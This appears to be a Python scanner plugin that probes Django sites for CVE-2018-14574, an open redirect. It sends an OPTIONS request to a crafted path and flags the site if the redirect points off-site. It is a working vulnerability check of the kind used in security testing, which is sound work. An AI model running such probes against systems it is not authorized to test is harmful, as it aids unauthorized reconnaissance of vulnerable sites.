#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

"""
CVE-ID: CVE-2018-14574
scope: 1.11.0 <= version < 1.11.15 和 2.0.0 <= version < 2.0.8
"""

import requests
import urllib.parse
requests.packages.urllib3.disable_warnings()

def info(data):
    info = {
        "name": "django_url_location",
        "info": "django_url_location.",
        "level": "medium",
        "type": "info",
    }
    return info

def prove(data):
    init(data, 'http')
    if data['base_url']:
        try:
            url = base_url + "/baidu.com"
            res = requests.options(url, headers=data['headers'], verify=False,
                                   timeout=data['timeout'])
            if 'Location'in res.headers.keys():
                if res.headers['Location'].startswith('//baidu.com'):
                    data['flag'] = 1
                    data['data'].append({"url": url})
                    data['res'].append({"info": url, "key": url})
        except:
            pass
    return data

